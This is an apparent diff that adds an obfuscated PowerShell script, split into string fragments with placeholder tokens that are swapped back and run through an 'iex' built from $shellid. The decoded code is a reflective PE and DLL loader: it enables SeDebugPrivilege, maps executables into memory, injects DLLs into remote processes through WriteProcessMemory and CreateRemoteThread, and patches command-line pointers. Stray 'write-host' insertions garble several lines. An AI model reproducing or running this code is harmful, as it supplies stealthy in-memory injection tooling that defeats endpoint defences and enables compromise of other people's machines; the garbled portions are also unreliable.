+		CXljPEInfo,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljStartAddress,
+		
+		[Parameter(ParameterSetName = GEy9EndAddressGEy9, Position = 3, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljEndAddress,
+		
+		[Parameter(ParameterSetName = GEy9SizeGEy9, Position = 3, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljSize
+		)
+		
+		[IntPtr]CXljFinalEndAddress = [IntPtr]::Zero
+		if (CXljPsCmdlet.ParameterSetName -eq GEy9SizeGEy9)
+		{
+		','	{
+			if (CXljNXC','s,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants
+		)
+		
+		[IntPtr]CXljThreadHandle = CXljWin32Functions.GetCurrentThread.Invoke()
+		if (CXljThreadHandle -eq [IntPtr]::Zero)
+		{
+			Throw GEy9Unable to get the handle to the current threadGEy9
+		}
+		
+		[IntPtr]CXljThreadToken = [IntPtr]::Zero
+		[Bool]CXljResult = CXljWin32Functions.OpenThreadToken.Invoke(CXljThreadHandle, CXljWin32Constants.TOKEN_QUERY -bor CXljWin32Constants.TOKEN_ADJUST_PRIVILEGES, CXljfalse, [Ref]CXljThreadToken)
+		if (CXljResult -eq CXljfalse)
+		{
+			CXljErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			if (CXljErrorCode -eq CXljWin32Constants.ERROR_NO_TOKEN)
+			{
+				CXljResult = CXljWin32Functions.ImpersonateSelf.Invoke(3)
+				if (CXljResult -eq CXljfalse)
+				{
+					Throw GEy9Unable to impersonate selfGEy9
+				}
+				
+				CXljResult = CXljWin32Functions.OpenThreadToken.Invoke(CXljThreadHandle, CXljWin32Constants.TOKEN_QUERY -bor CXljWin32Constants.TOKEN_ADJUST_PRIVILEGES, CXljfalse, [Ref]CXljThreadToken)
+				if (CXljResult -eq CXljfalse)
+				{
+					Throw GEy9Unable to OpenThreadToken.GEy9
+				}
+			}
+			else
+			{
+				Throw GEy9Unable to OpenThreadToken. Error code: CXljErrorCodeGEy9
+			}
+		}
+		
+		[IntPtr]CXljPLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.LUID))
+		CXljResult = CXljWin32Functions.LookupPrivilegeValue.Invoke(CXljnull, GEy9SeDebugPrivilegeGEy9, CXljPLuid)
+		if (CXljResult -eq CXljfalse)
+		{
+			Throw GEy9Unable to call LookupPrivilegeValueGEy9
+		}
+
+		[UInt32]CXljTokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.TOKEN_PRIVILEGES)
+		[IntPtr]CXljTokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljTokenPrivSize)
+		CXljTokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljTokenPrivilegesMem, [Type]CXljWin32Types.TOKEN_PRIVILEGES)
+		C','e9MjPublice9Mj)).SetOffset(48) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorSubsystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(50) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjWin32VersionValuee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(52) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfImagee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(56) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeaderse9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(60) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCheckSume9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(64) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSubsysteme9Mj, CXljSubSystemType, e9MjPublice9Mj)).SetOffset(68) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDllCharacteristicse9Mj, CXljDllCharacteristicsType, e9MjPublice9Mj)).SetOffset(70) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfStackReservee9Mj, [UInt64], e9MjPublice9Mj)).SetOffset(72) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfStackCommite9Mj, [UInt64], e9MjPublice9Mj)).SetOffset(80) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeapReservee9Mj, [UInt64], e9MjPublice9Mj)).SetOffset(88) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeapCommite9Mj, [UInt64], e9MjPublice9Mj)).SetOffset(96) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjLoaderFlagse9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(104) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjNumberOfRvaAndSizese9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(108) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjExportTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(112) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjImportTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(120) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjResourceTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(128) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjExceptionTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(136) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCertificateTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(144) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBaseRelocationTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(152) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDebuge9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(160) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjArchitecturee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(168) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjGlobalPtre9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(176) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjTLSTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(184) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjLoadConfigTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(192) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBoundImporte9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(200) Jbi write-host
+','[System.Object]
+		CXljWin32Types,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants
+		)
+		
+		if (CXljPEHandle -eq CXljnull -or CXljPEHandle -eq [IntPtr]::Zero)
+		{
+			throw e9MjPEHandle is null or IntPtr.Zeroe9Mj
+		}
+		
+		CXljPEInfo = New-Object System.Object
+		
+		#Get NtHeaders information
+		CXljNtHeadersInfo = Get-ImageNtHeaders -PEHandle CXljPEHandle -Win32Types CXljWin32Types
+		
+		#Build the PEInfo object
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name PEHandle -Value CXljPEHandle
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (CXljNtHeadersInfo.IMAGE_NT_HEADERS)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (CXljNtHeadersInfo.NtHeadersPtr)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name PE64Bit -Value (CXljNtHeadersInfo.PE64Bit)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name e9MjSizeOfImagee9Mj -Value (CXljNtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+		
+		if (CXljPEInfo.PE64Bit -eq CXljtrue)
+		{
+			[IntPtr]CXljSectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_NT_HEADERS64)))
+			CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value CXljSectionHeaderPtr
+		}
+		else
+		{
+			[IntPtr]CXljSectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_NT_HEADERS32)))
+			CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value CXljSectionHeaderPtr
+		}
+		write-host
+		if ((CXljNtHeadersInfo.IMAGE_NT_HEADERS.FileHeader','UInt16], e9MjPublice9write-hostOut-Null
+		CXljTypeBuilder.DefineField(e9Mje_csume9Mj, [UInt16], e9MjPublice9Mj) Jbwrite-hostll
+		CXljTypeBuilder.DefineField(e9Mje_ipe9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_cse9Mj, [UInt16], e9MjPublice9Mj) Jbi Out-write-host
+		CXljTypeBuilder.DefineField(e9Mje_lfarlce9Mj, [UInt16], e9MjPublice9Mj) Jbwrite-hostll
+		CXljTypeBuilder.DefineField(e9Mje_ovnoe9Mj, [UInt16], e9MjPublice9Mj) Jbi Out-Null
+
+		CXlje_resField = CXljTypeBuilder.DefineField(e9Mje_rese9Mj, [UInt16[]], e9MjPublic, HasFieldMarshale9Mj)
+		CXljConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+		CXljFieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField(e9MjSizeConste9Mj))
+		CXljAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder(CXljConstructorInfo, CXljConstructorValue, CXljFieldArray, @([Int32] 4))
+		CXlje_resField.SetCustomAttribute(CXlj','r]CXljWStringFuncAddr = Get-MemoryProcAddress -PEHandle CXljPEHandle -FunctionName GEy9WStringFuncGEy9
+				    if (CXljWStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw GEy9Couldne9Mjt find function address.GEy9
+				    }
+				    CXljWStringFuncDelegate = Get-DelegateType @() ([IntPtr])
+				    CXljWStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljWStringFuncAddr, CXljWStringFuncDelegate)
+				    [IntPtr]CXljOutputPtr = CXljWStringFunc.Invoke()
+				    CXljOutput = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(CXljOutputPtr)
+				    Write-Output CXljOutput
+	            }
+
+	            e9MjStringe9Mj {
+	                Write-Verbose GEy9Calling function with String return typeGEy9
+				    [IntPtr]CXljStringFuncAddr = Get-MemoryProcAddress -PEHandle CXljPEHandle -FunctionName GEy9StringFuncGEy9
+				    if (CXljStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw GEy9Couldne9Mjt find function address.GEy9
+				    }
+				    CXljStringFuncDelegate = Get-DelegateType @() ([IntPtr])
+				    CXljStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljStringFuncAddr, CXljStringFuncDelegate)
+				    [IntPtr]CXljOutputPtr = CXljStringFunc.Invoke()
+				    CXljOutput = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljOutputPtr)
+				    Write-Output CXljOutput
+	            }
+
+	            e9MjVoide9Mj {
+	                Write-Verbose GEy9Calling function with Void return typeGEy9
+				    [IntPtr]CXljVoidFuncAddr = Get-MemoryProcAddress -PEHandle CXljPEHandle -FunctionName GEy9VoidFuncGEy9
+				    if (CXljVoidFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw GEy9Couldne9Mjt find function address.GEy9
+				    }
+				    CXljVoidFuncDelegate = Get-DelegateType @() ([Void])
+				    CXljVoidFunc = [System.Runwrite-hosteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVoidFuncAddr, CXljVoidFuncDelegate)
+				    CXljVoidFunc.Invoke() Jbi Out-Null
+	            }
+	        }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif ((CXljPEInfo.FileType -ieq GEy9DLLGEy9) -and (CXljRemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			CXljVoidFuncAddr = Get-MemoryProcAddress -PEHandle CXljPEHandle -FunctionName GEy9VoidFuncGEy9
+			if ((CXljVoidFuncAdd','Attributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_NT_HEADERS32e9Mj, CXljAttributes, [System.ValueType], 248)
+		CXljTypeBuilder.Def','.Characteristics -band CXljWin32Constants.IMAGE_FILE_DLL) -eq CXljWin32Constants.IMAGE_FILE_DLL)
+		{
+			CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name FileType -Value e9MjDLLe9Mj
+		}
+		elseif ((CXljNtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band CXljWin32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq CXljWin32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
+		{
+			CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name FileType -Value e9MjEXEe9Mj
+		}
+		else
+		{
+			Throw GEy9PE file is not an EXE or DLLGEy9
+		}
+		
+		return CXljPEInfo
+	}
+	
+	
+	Function Import-DllInRemoteProcess
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljRemoteProcHandle,
+		
+		[Parameter(Position=1, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljImportDllPathPtr
+		)
+		
+		CXljPtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+		
+		CXljImportDllPath = ','q 4 -and [Int32]CXljOriginalThunkRefVal -lt 0)
+					{
+						[IntPtr]CXljProcedureNamePtr = [IntPtr]CXljOriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
+                        CXljLoadByOrdinal = CXljtrue
+					}
+                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]CXljOriginalThunkRefVal -lt 0)
+					{
+						[IntPtr]CXljProcedureNamePtr = [Int64]CXljOriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
+                        CXljLoadByOrdinal = CXljtrue
+					}
+					else
+					{
+						[IntPtr]CXljStringAddr = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljOriginalThunkRefVal)
+						CXljStringAddr = Add-SignedIntAsUnsigned CXljStringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
+						CXljProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljStringAddr)
+                        CXljProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(CXljProcedureName)
+					}
+					
+					if (CXljRemoteLoading -eq CXljtrue)
+					{
+						[IntPtr]CXljNewThunkRef = Get-RemoteProcAddress -RemoteProcHandle CXljRemoteProcHandle -RemoteDllHandle CXljImportDllHandle -FunctionNamePtr CXljProcedureNamePtr -LoadByOrdinal CXljLoadByOrdinal
+					}
+					else
+					{
+				        [IntPtr]CXljNewThunkRef = CXljWin32Functions.GetProcAddressIntPtr.Invoke(CXljImportDllHandle, CXljProcedureNamePtr)
+					}
+					
+					if (CXljNewThunkRef -eq CXljnull -or CXljNewThunkRef -eq [IntPtr]::Zero)
+					{
+                        if (CXljLoadByOrdinal)
+ ','ants Jbi Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name ERR',' @([System.Runtime.InteropServices.HandleRef]CXljHandleRef, CXljProcedure))
+	}
+	
+	
+	Function Enable-SeDebugPrivilege
+	{
+		Param(
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Type','jtrue
+		}
+		
+		#Get basic PE information
+		Write-Verbose GEy9Getting basic PE information from the fileGEy9
+		CXljPEInfo = Get-PEBasicInfo -PEBytes CXljPEBytes -Win32Types CXljWin32Types
+		CXljOriginalImageBase = CXljPEInfo.OriginalImageBase
+		CXljNXCompatible = CXljtrue
+		if ((CXljPEInfo.DllCharacteristics -band CXljWin32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne CXljWin32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
+		{
+			Write-Warning GEy9PE is not compatible with DEP, might cause issuesGEy9 -WarningAction Continue
+			CXljNXCompatible = CXljfalse
+		}
+		
+		
+		#Verify that the PE and the current process are the same bits (32bit or 64bit)
+		CXljProcess64Bit = CXljtrue
+		if (CXljRemoteLoading -eq CXljtrue)
+		{
+			CXljKernel32Handle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9kernel32.dllGEy9)
+			CXljResult = CXljWin32Functions.GetProcAddress.Invoke(CXljKernel32Handle, GEy9IsWow64ProcessGEy9)
+			if (CXljResult -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Couldne9Mjt locate IsWow64Process function to determine if target process is 32bit or 64bitGEy9
+			}
+			
+			[Bool]CXljWow64Process = CXljfalse
+			CXljSuccess = CXljWin32Functions.IsWow64Process.Invoke(CXljRemoteProcHandle, [Ref]CXljWow64Process)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Throw GEy9Call to IsWow64Process failedGEy9
+			}
+			
+			if ((CXljWow64Process -eq CXljtrue) -or ((CXljWow64Process -eq CXljfalse) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
+			{
+				CXljProcess64Bit = CXljfalse
+			}
+			
+			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
+			CXljPowerShell64Bit = CXljtrue
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
+			{
+				CXljPowerShell64Bit = CXljfalse
+			}
+			if (CXljPowerShell64Bit -ne CXljProcess64Bit)
+			{
+				throw GEy9PowerS','legateForFunctionPointer(CXljDllMainPtr, CXljDllMainDelegate)
+		write-host
+		CXljDllMain.Invoke(CXljPEInfo.PEHandle, 0, [IntPtr]::Zero) Jbi Out-Null
+		
+		
+		CXljSuccess = CXljWin32Functions.VirtualFree.Invoke(CXljPEHandle, [UInt64]0, CXljWin32Constants.MEM_RELEASE)
+		if (CXljSuccess -eq CXljfalse)
+		{
+			Write-Warning GEy9Unable to call VirtualFree on the PEe9Mjs memory. Continuing anyways.GEy9 -WarningAction Continue
+		}
+	}
+
+
+	Function Main
+	{
+		CXljWin32Functions = Get-Win32Functions
+		CXljWin32Types = Get-Win32Types
+		CXljWin32Constants =  Get-Win32Constants
+		
+		CXljRemoteProcHandle = [IntPtr]::Zero
+	
+	','elegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+		CXljVirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVirtualProtectAddr, CXljVirtualProtectDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name VirtualProtect -Value CXljVirtualProtect
+		
+		CXljGetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
+		CXljGetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
+		CXljGetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljGetModuleHandleAddr, CXljGetModuleHandleDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name GetModuleHandle -Value CXljGetModuleHandle
+		
+		CXljFreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
+		CXljFreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
+		CXljFreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljFreeLibraryAddr, CXljFreeLibraryDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name FreeLibrary -Value CXljFreeLibrary
+		
+		CXljOpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+	    CXljOpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	    CXljOpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljOpenProcessAddr, CXljOpenProcessDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name OpenProcess -Value CXljOpenProcess
+		
+		CXljWaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+	    CXljWaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
+	    CXljWaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljWaitForSingleObjectAddr, CXljWaitForSingleObjectDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value CXljWaitForSingleObject
+		
+		CXljWriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        CXljWriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        CXljWriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljWriteProcessMemoryAddr, CXljWriteProcessMemoryDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value CXljWriteProcessMemory
+		
+		CXljReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
+        CXljReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        CXljReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljReadProcessMemoryAddr, CXljReadProcessMemoryDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value CXljReadProcessMemory
+		
+		CXljCreateRemoteThreadAddr = Get-ProcA','A_DIRECTORY = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value CXljIMAGE_DATA_DIRECTORY
+
+		#Struct IMAGE_FILE_HEADER
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_FILE_HEADERe9Mj, CXljAttributes, [System.ValueType], 20)
+		CXljTyp','pServices.Marshal]::StructureToPtr(CXljNewACmdLnPtr, CXljACmdLnAddr, CXljfalse)write-host
+				CXljWin32Functions.VirtualProtect.Invoke(CXljACmdLnAddr, [UInt32]CXljPtrSize, [UInt32](CXljOldProtectFlag), [Ref]CXljOldProtectFlag) Jbi Out-Null
+				
+				CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljWCmdLnAddr, [UInt32]CXljPtrSize, [UInt32](CXljWin32Constants.PAGE_EXECUTE_READWRITE), [Ref]CXljOldProtectFlag)
+				if (CXljSuccess = CXljfalse)
+				{
+					throw GEy9Call to VirtualProtect failedGEy9
+				}
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljNewWCmdLnPtr, CXljWCmdLnAddr, CXljfalse)
+				CXljWin32Functions.Virtu')).REPlACE('e9Mj',[stRing][Char]39).REPlACE(([Char]73+[Char]106+[Char]98+[Char]102),[stRing][Char]92).REPlACE('GEy9',[stRing][Char]34).REPlACE('CXlj',[stRing][Char]36).REPlACE('Ppv','`').REPlACE('Jbi',[stRing][Char]124) |. ( $sHEllid[1]+$SHELliD[13]+'X')
